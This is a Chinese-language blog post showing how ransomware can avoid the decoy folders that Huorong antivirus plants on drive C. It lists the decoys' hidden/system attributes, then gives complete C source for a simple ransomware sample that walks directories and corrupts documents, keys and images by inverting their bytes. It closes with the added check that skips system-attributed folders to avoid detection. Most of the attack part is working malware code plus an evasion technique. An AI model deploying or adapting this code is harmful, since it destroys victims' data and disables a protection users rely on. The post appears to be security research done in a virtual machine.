---
title: 绕过火绒勒索病毒诱捕功能的一种方法
date: 2021-09-09 16:45:56
tags: [病毒,勒索软件,诱饵文件]
categories: Malware
toc: true
typora-root-url: ransomware-bypass-huorong-decoy-file
---

火绒的设置中可以勾选开启勒索病毒诱捕功能，开启后，火绒会在C盘创建两个文件夹，里面包含一些诱饵文件。当勒索软件对这些诱饵文件加密时，就会被火绒拦截。

https://bbs.huorong.cn/thread-22817-1-1.html

![火绒开启勒索病毒诱捕功能的界面](/image-20210909165324238.png)

这两个文件夹的属性与普通的用户文件夹不同。勒索软件如果只需要加密普通的用户文件夹，则只用进行一些简单的判断就能识别并避开这些诱饵文件了。

<!--more-->

## 火绒创建的两个文件夹

在C盘中执行`dir /A`可以查看所有被隐藏的文件夹：

```
C:\>dir /A
 驱动器 C 中的卷没有标签。
 卷的序列号是 D227-C50D

 C:\ 的目录

2021/09/08  20:52    <DIR>           program694
2021/09/08  20:37    <DIR>          $Recycle.Bin
2021/09/09  10:43    <DIR>          $WinREAgent
2019/12/07  17:08           413,738 bootmgr
2019/12/07  17:08                 1 BOOTNXT
2021/07/29  19:06    <JUNCTION>     Documents and Settings [C:\Users]
2021/07/29  19:14             8,192 DumpStack.log.tmp
2021/07/29  19:14     2,013,265,920 pagefile.sys
2019/12/07  17:14    <DIR>          PerfLogs
2021/09/09  10:56    <DIR>          Program Files
2021/09/08  20:52    <DIR>          Program Files (x86)
2021/09/08  20:52    <DIR>          ProgramData
2021/07/29  19:06    <DIR>          Recovery
2021/07/29  19:14        16,777,216 swapfile.sys
2021/09/08  20:52    <DIR>          System Volume Information
2021/07/29  19:14    <DIR>          Users
2021/09/08  20:45    <DIR>          Windows
2021/09/08  20:52    <DIR>          Zsetup287
               5 个文件  2,030,465,067 字节
              13 个目录  3,322,830,848 可用字节
```

火绒创建的两个文件夹名称分别为" program694"和"Zsetup287"，它们在文件资源管理器中是看不到的，这一特性可以避免用户误访问诱饵文件造成误报。

借助FindFirstFile和FindNextFile可以获取一个路径下的所有文件和文件夹，这些文件的信息都返回到一个`WIN32_FIND_DATA`类型的结构体中，这个结构体里有个元素`dwFileAttributes`，表示了该文件的信息，如是否为文件夹、是否为隐藏文件、是否为系统文件等。

[WIN32_FIND_DATAA](https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-win32_find_dataa)

编写程序，查看C盘中文件的文件名和部分文件属性：

```c
#include <windows.h>
#include <stdio.h>
#include <string.h>

void ParseFileSystem(char *path) {
    WIN32_FIND_DATAA FileData;
    HANDLE hFindFile = FindFirstFileA(path, &FileData);
    do {
        printf(FileData.cFileName);
        for (int i = 0; i < 25 - (int)strlen(FileData.cFileName); i++) {
            printf(" ");
        }
        if (FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            printf("\t<DIR> ");
        } else {
            printf("\t<FILE>");
        }
        if (FileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) {
            printf("\tHidden");
        } else {
            printf("\tShow  ");
        }
        if (FileData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) {
            printf("\tSystem");
        } else {
            printf("\tNormal");
        }
        printf("\n");
    } while (FindNextFileA(hFindFile, &FileData));
}

int main(int argc, char **argv) {
    char path[100] = "C:\\*";
    ParseFileSystem(path);
    return 0;
}
```

运行结果：

```
C:\>d:\mydir.exe
 program694                     <DIR>   Hidden  System
$Recycle.Bin                    <DIR>   Hidden  System
$WinREAgent                     <DIR>   Hidden  Normal
bootmgr                         <FILE>  Hidden  System
BOOTNXT                         <FILE>  Hidden  System
Documents and Settings          <DIR>   Hidden  System
DumpStack.log.tmp               <FILE>  Hidden  System
pagefile.sys                    <FILE>  Hidden  System
PerfLogs                        <DIR>   Show    Normal
Program Files                   <DIR>   Show    Normal
Program Files (x86)             <DIR>   Show    Normal
ProgramData                     <DIR>   Hidden  Normal
Recovery                        <DIR>   Hidden  System
swapfile.sys                    <FILE>  Hidden  System
System Volume Information       <DIR>   Hidden  System
Users                           <DIR>   Show    Normal
Windows                         <DIR>   Show    Normal
Zsetup287                       <DIR>   Hidden  System
```

发现火绒创建的两个诱饵文件夹都具有`FILE_ATTRIBUTE_HIDDEN`和`FILE_ATTRIBUTE_SYSTEM`属性。勒索软件只需要避开具有`FILE_ATTRIBUTE_SYSTEM`属性的文件夹就可以避开火绒的诱饵文件了。

## 编写简单的勒索软件样本

首先写一个可以被火绒拦截的简单勒索软件。只需要借助FindFirstFile和FindNextFile遍历文件，判断一下文件后缀名，然后再读写文件就行了：

```c
#include <windows.h>
#include <stdio.h>

// 将目录名dir和文件名filename拼接
void concat_path(char *dir, char *filename) {
    int i = 0;
    while (dir[i] != '\0') {
        i++;
    }
    if (dir[i-1] != '\\') {
        dir[i] = '\\';
        i++;
    }
    int j = 0;
    while (filename[j] != '\0') {
        dir[i] = filename[j];
        i++;
        j++;
    }
    dir[i] = '\0';
}

// 从路径中删去最后一项目录名/文件名
void remove_file_path(char *dir) {
    int i = 0;
    while (dir[i] != '\0') {
        i++;
    }
    if (dir[i-1] == '\\') {
        i -= 2;
    }
    while (dir[i] != '\\') {
        i--;
    }
    dir[i+1] = '\0';
}

BOOL is_target_filetype(char *filepath) {
    int length = strlen(filepath);
    BOOL result = FALSE;
    if (length >= 4) {
        result = result || !strcmp(&filepath[length-4], ".doc");
        result = result || !strcmp(&filepath[length-4], ".xls");
        result = result || !strcmp(&filepath[length-4], ".sql");
        result = result || !strcmp(&filepath[length-4], ".pem");
        result = result || !strcmp(&filepath[length-4], ".jpg");
        result = result || !strcmp(&filepath[length-4], ".rtf");
        result = result || !strcmp(&filepath[length-4], ".txt");
        result = result || !strcmp(&filepath[length-4], ".mdb");
    }
    if (length >= 5) {
        result = result || !strcmp(&filepath[length-5], ".xlsx");
        result = result || !strcmp(&filepath[length-5], ".docx");
    }
    return result;
}

void ParseFileSystem(char *path) {
    WIN32_FIND_DATAA FileData;
    concat_path(path, "*");
    HANDLE hFindFile = FindFirstFileA(path, &FileData);
    remove_file_path(path);
    do {
        if (FileData.cFileName[0] == '.') {
            continue;
        }
        if (FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            concat_path(path, FileData.cFileName);
            ParseFileSystem(path);
            remove_file_path(path);
        } else if (is_target_filetype(FileData.cFileName)) {
            concat_path(path, FileData.cFileName);
            printf(path);
            HANDLE hFile = CreateFile(path,
                GENERIC_READ | GENERIC_WRITE,
                0,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL);
            if (INVALID_HANDLE_VALUE == hFile) {
                goto nextfile;
            }
            char Buffer[100];
            int num;
            if (!ReadFile(hFile, Buffer, 100, &num, NULL)) {
                goto nextfile;
            }
            for (int i = 0; i < num; i++) {
                Buffer[i] = ~Buffer[i];
            }
            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
            if(WriteFile(hFile, Buffer, num, NULL, NULL)) {
                printf("\tsuccess");
            }
        nextfile:
            printf("\n");
            remove_file_path(path);
        }
    } while (FindNextFileA(hFindFile, &FileData));
}

int main() {
    char path[100] = "D:\\aaa";
    ParseFileSystem(path);
    return 0;
}
```

编译完成后，在虚拟机中使用十六进制编辑器（如010 Editor）把"D:\\aaa"字符串替换成"C:\\"，然后在虚拟机中运行。勒索软件首先就遍历到了火绒设计的诱饵文件夹" program694"中的诱饵文件并尝试对其进行加密，于是就被火绒拦截了：

![简单勒索软件运行截图](/image-20210909173521166.png)

![火绒拦截简单勒索软件](/image-20210909173558890.png)

## 判断文件属性并避开诱饵文件

在遍历文件的代码中添加这一段代码：

```c
        if (FileData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) {
            continue;
        }
```

如果文件具有`FILE_ATTRIBUTE_SYSTEM`属性就跳过这一文件，这样就避开了火绒的诱饵文件。用同样的方式在虚拟机中运行程序：

![可避开火绒诱饵文件的勒索软件运行截图](/image-20210909174716265.png)

程序可以正常运行并且没有被火绒的勒索病毒诱捕功能拦截。

